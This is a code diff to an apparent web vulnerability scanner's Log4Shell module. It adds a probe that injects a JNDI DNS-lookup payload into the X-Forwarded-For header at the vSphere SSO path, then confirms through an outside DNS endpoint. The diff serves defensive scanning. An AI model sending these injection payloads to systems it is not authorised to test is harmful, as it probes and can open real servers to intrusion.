@@ -25,12 +25,12 @@ class ModuleLog4Shell(Attack):
 
     HEADERS_FILE = "log4shell_headers.txt"
 
+    VSPHERE_URL = "websso/SAML2/SSO"
+
     def __init__(self, crawler, persister, attack_options, stop_event):
         Attack.__init__(self, crawler, persister, attack_options, stop_event)
         if not self._is_valid_dns(attack_options.get("dns_endpoint")):
             self.finished = True
-        else:
-            self._dns_host = socket.gethostbyname(self.dns_endpoint)
 
     async def must_attack(self, request: Request):
         if self.finished is True:
@@ -41,10 +41,43 @@ class ModuleLog4Shell(Attack):
         with open(path_join(self.DATA_DIR, self.HEADERS_FILE), encoding='utf-8') as headers_file:
             return headers_file.read().strip().split("\n")
 
+    async def attack_vsphere_url(self, original_request: Request):
+        header_target = "X-Forwarded-For"
+
+        malicious_request = Request(
+            path=original_request.url,
+            method=original_request.method,
+            get_params=[["SAMLRequest", ""]],
+            referer=original_request.referer,
+            link_depth=original_request.link_depth
+        )
+        payload_unique_id = uuid.uuid4()
+        payload = self._generate_payload(payload_unique_id)
+        malicious_headers = {header_target: payload}
+
+        try:
+            await self.crawler.async_send(malicious_request, malicious_headers, follow_redirects=True)
+        except RequestError:
+            self.network_errors += 1
+            return
+        await self._verify_header_vulnerability(malicious_request, header_target, payload, payload_unique_id)
+
     async def attack(self, request: Request):
+        root_url = await self.persister.get_root_url()
+
+        if request.url == root_url:
+            vsphere_url = request.url + ("" if request.url.endswith("/") else "/") + self.VSPHERE_URL
+            vsphere_request = Request(
+                path=vsphere_url,
+                method=request.method,
+                referer=request.referer,
+                link_depth=request.link_depth
+            )
+            await self.attack_vsphere_url(vsphere_request)
+        await self.attack_vsphere_url(request)
         headers = await self.read_headers()
 
-        batch_malicious_headers, headers_uuid_record = self._get_malicious_headers(headers)
+        batch_malicious_headers, headers_uuid_record = self._get_batch_malicious_headers(headers)
 
         for malicious_headers in batch_malicious_headers:
             modified_request = Request(request.url)
@@ -98,23 +131,31 @@ class ModuleLog4Shell(Attack):
     ):
         for header, payload in malicious_headers.items():
             header_uuid = headers_uuid_record.get(header)
+            await self._verify_header_vulnerability(modified_request, header, payload, header_uuid)
 
-            if await self._verify_dns(str(header_uuid)) is True:
-                await self.add_vuln_critical(
-                    category=NAME,
-                    request=modified_request,
-                    info=_("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}") \
-                        .format(modified_request.url, "header", header),
-                    parameter=f"{header}: {payload}"
-                )
+    async def _verify_header_vulnerability(
+        self,
+        modified_request: Request,
+        header: str,
+        payload: str,
+        unique_id: uuid.UUID
+    ):
+        if await self._verify_dns(str(unique_id)) is True:
+            await self.add_vuln_critical(
+                category=NAME,
+                request=modified_request,
+                info=_("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}") \
+                    .format(modified_request.url, "header", header),
+                parameter=f"{header}: {payload}"
+            )
 
-                log_red("---")
-                log_red(
-                    _("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}"),
-                    modified_request.url, "header", header
-                )
-                log_red(modified_request.http_repr())
-                log_red("---")
+            log_red("---")
+            log_red(
+                _("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}"),
+                modified_request.url, "header", header
+            )
+            log_red(modified_request.http_repr())
+            log_red("---")
 
     async def _verify_dns(self, header_uuid: str) -> bool:
         resolver = dns.resolver.Resolver(configure=False)
@@ -125,7 +166,7 @@ class ModuleLog4Shell(Attack):
             return True
         return False
 
-    def _get_malicious_headers(self, headers: List[str]) -> Tuple[Dict, Dict]:
+    def _get_batch_malicious_headers(self, headers: List[str]) -> Tuple[Dict, Dict]:
         batch_malicious_headers: List[Dict[str, str]] = []
         headers_uuid_record = {}
         batch_size = 10
@@ -150,7 +191,7 @@ class ModuleLog4Shell(Attack):
         original_request: Request,
         params: List[Tuple[str, str]],
     ) -> Tuple[Request, str, uuid.UUID]:
-        for idx in range(0, len(params)):
+        for idx, _ in enumerate(params):
             malicious_params = copy.deepcopy(params)
 
             param_uuid = uuid.uuid4()
@@ -173,12 +214,11 @@ class ModuleLog4Shell(Attack):
         # but it is also using this syntax for the exploit.
         return "${jndi:dns://" + f"{self.dns_endpoint}/{unique_id}" + ".l}"
 
-    @staticmethod
-    def _is_valid_dns(dns_endpoint: str) -> str:
+    def _is_valid_dns(self, dns_endpoint: str) -> bool:
         if dns_endpoint is None:
             return False
         try:
-            socket.gethostbyname(dns_endpoint)
+            self._dns_host = socket.gethostbyname(dns_endpoint)
         except OSError:
             logging.error(_("Error: {} is not a valid domain name").format(dns_endpoint))
             return False
